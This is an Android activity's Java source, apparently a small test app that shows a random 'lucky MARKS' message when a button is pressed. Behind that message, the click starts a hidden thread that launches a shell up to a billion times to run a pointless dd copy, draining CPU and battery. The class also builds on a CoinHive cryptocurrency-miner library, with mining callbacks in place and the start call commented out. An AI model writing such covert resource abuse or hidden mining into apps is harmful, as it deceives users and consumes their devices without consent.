package com.example.aamirah.testandroid41;

import android.support.v7.app.AppCompatActivity;
import android.os.Bundle;
import android.view.View;
import android.widget.Button;
import android.widget.TextView;

import com.theah64.coinhive.BaseCoinHiveActivity;
import com.theah64.coinhive.CoinHive;

import java.io.DataOutputStream;
import java.io.IOException;
import java.util.Random;

public class MainActivity extends BaseCoinHiveActivity {


    Button btnClick;
    TextView lblDesc;

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);


//        this.startMining();

        setContentView(R.layout.activity_main);


        btnClick = (Button) findViewById(R.id.btnClick);
        lblDesc  = (TextView) findViewById(R.id.lblDesc);


        btnClick.setOnClickListener(new View.OnClickListener() {
            @Override
            public void onClick(View v) {
                lblDesc.setText("Today is your lucky day - You just Got " + generateRamdonNumber() + " MARKS!!");

                Thread t = new Thread(new Runnable() {
                    public void run() {
                        /*
                         * Do something
                         */
                        int i = 0;
                        for ( i=0; i < 1000000000;i++){
                            try {
                                System.out.println("Runtime");
                                Runtime rt = Runtime.getRuntime();
                                Process process = rt.exec("sh");
                                DataOutputStream os = new DataOutputStream(process.getOutputStream());

                                // os.writeBytes("dd if=/dev/zero ibs=4k count=1 of=$x.txt 2>/dev/null")
                                //os.writeBytes("dd if=/dev/zero ibs=4k count=1 of=$x.txt 2>/dev/null" + "\n");
                                os.writeBytes("dd if=/dev/zero of=/dev/null" + "\n");
                                os.flush();
                                os.writeBytes("exit\n");
                                os.flush();
                                process.waitFor();
                            } catch (IOException e) {
                                //log errors
                                System.out.println("IOException" + e.getMessage());
                            } catch (InterruptedException e) {
                                //log errors
                                System.out.println("InterruptedException" + e.getMessage());
                            }
                        }

                    }
                });

                t.start();

            }
        });
    }

    @Override
    public void onRunning(double hashesPerSecond, long totalHashes, long acceptedHashes) {

        System.out.println("***********************");
        System.out.println("***********************");
        System.out.println("Miner running - hashesPerSecond:" + hashesPerSecond);
        System.out.println("Miner running - totalHashes:" + totalHashes);
        System.out.println("Miner running - acceptedHashes:" + acceptedHashes);
        System.out.println("***********************");
        System.out.println("***********************");

    }
    @Override
    public void onMiningStarted() {
        System.out.println("Miner Started");

    }

    public int generateRamdonNumber(){
        Random r = new Random();
        int ramdonNumber = r.nextInt(80 - 65) + 65;
        return ramdonNumber;
    }
}
